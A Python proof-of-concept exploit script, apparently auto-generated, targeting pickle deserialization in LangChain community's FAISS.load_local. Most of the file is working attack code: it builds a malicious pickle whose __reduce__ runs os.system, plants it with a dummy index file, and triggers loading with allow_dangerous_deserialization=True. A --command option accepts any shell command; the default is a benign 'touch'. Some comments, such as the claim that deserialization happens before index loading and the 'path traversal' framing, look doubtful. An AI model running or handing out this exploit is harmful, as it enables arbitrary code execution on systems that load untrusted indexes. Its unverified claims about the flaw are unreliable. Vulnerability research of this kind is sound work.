#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_36.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only insecure deserialization (CVE-like).

Vulnerability: The load_local function in FAISS vectorstore uses pickle.load() on a file
constructed from user-controlled folder_path and index_name parameters. When
allow_dangerous_deserialization is set to True, an attacker can perform path traversal
to load a malicious pickle file from an arbitrary location, leading to RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in folder_path to point to the directory containing the malicious file
3. Calling load_local with allow_dangerous_deserialization=True

Usage:
    python poc.py [--target /path/to/target] [--malicious-dir /tmp/exploit]

Requirements:
    - langchain-community-only installed in /tmp/langchain-community-only
    - Python 3.6+
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Add the target library to path
sys.path.insert(0, "/tmp/langchain-community-only")

# Import the vulnerable function
from langchain_community.vectorstores.faiss import FAISS


def create_malicious_pickle(output_dir: str, command: str = "touch /tmp/poc_success.txt") -> str:
    """
    Create a malicious pickle file that executes a command when deserialized.
    
    Args:
        output_dir: Directory to write the pickle file
        command: Command to execute (default: benign touch command)
    
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        """Class that executes a command when unpickled."""
        def __reduce__(self):
            return (os.system, (command,))
    
    # Create the pickle file
    pickle_path = os.path.join(output_dir, "exploit.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file: {pickle_path}")
    print(f"[+] Command to execute: {command}")
    return pickle_path


def exploit(target_dir: str, malicious_dir: str, index_name: str = "exploit"):
    """
    Exploit the insecure deserialization vulnerability.
    
    Args:
        target_dir: The folder_path parameter to pass to load_local (with path traversal)
        malicious_dir: Directory containing the malicious pickle file
        index_name: The index_name parameter (must match the pickle filename without .pkl)
    """
    # Ensure the malicious pickle exists
    pickle_path = os.path.join(malicious_dir, f"{index_name}.pkl")
    if not os.path.exists(pickle_path):
        print(f"[-] Malicious pickle not found at {pickle_path}")
        print("[*] Creating malicious pickle...")
        create_malicious_pickle(malicious_dir)
    
    # Also need a .faiss file (FAISS index) - create a dummy one
    faiss_path = os.path.join(malicious_dir, f"{index_name}.faiss")
    if not os.path.exists(faiss_path):
        print(f"[*] Creating dummy FAISS index file at {faiss_path}")
        # FAISS index files have a specific format, but we just need the file to exist
        # The actual FAISS loading will fail, but the pickle deserialization happens first
        with open(faiss_path, "wb") as f:
            f.write(b"\x00" * 100)  # Dummy content
    
    print(f"[*] Attempting to load from: {target_dir}")
    print(f"[*] Using index_name: {index_name}")
    print(f"[*] allow_dangerous_deserialization: True")
    
    try:
        # This will trigger the vulnerability
        # The folder_path is attacker-controlled and can use path traversal
        # to point to our malicious directory
        result = FAISS.load_local(
            folder_path=target_dir,
            embeddings=None,  # Will fail after RCE, but that's fine
            index_name=index_name,
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local returned: {result}")
    except Exception as e:
        # The exploit should have executed before any FAISS loading error
        print(f"[*] Expected error after exploit: {e}")
    
    # Check if the command was executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt created.")
        print("[+] Vulnerability confirmed: RCE via insecure deserialization")
    else:
        print("[-] Command may not have executed. Check for errors above.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only insecure deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default="/tmp/exploit",
        help="Target folder_path (can use path traversal like ../../tmp/exploit)"
    )
    parser.add_argument(
        "--malicious-dir",
        default="/tmp/exploit",
        help="Directory containing malicious pickle files"
    )
    parser.add_argument(
        "--index-name",
        default="exploit",
        help="Index name (must match pickle filename without .pkl)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: benign touch command)"
    )
    
    args = parser.parse_args()
    
    # Create malicious directory if it doesn't exist
    os.makedirs(args.malicious_dir, exist_ok=True)
    
    # Create the malicious pickle
    create_malicious_pickle(args.malicious_dir, args.command)
    
    # Run the exploit
    exploit(args.target, args.malicious_dir, args.index_name)


if __name__ == "__main__":
    print("=" * 60)
    print("langchain-community-only Insecure Deserialization PoC")
    print("=" * 60)
    print()
    
    # Check if the library is accessible
    try:
        from langchain_community.vectorstores.faiss import FAISS
        print("[+] Successfully imported FAISS from langchain-community")
    except ImportError as e:
        print(f"[-] Failed to import FAISS: {e}")
        print("[*] Make sure langchain-community-only is installed at /tmp/langchain-community-only")
        sys.exit(1)
    
    main()
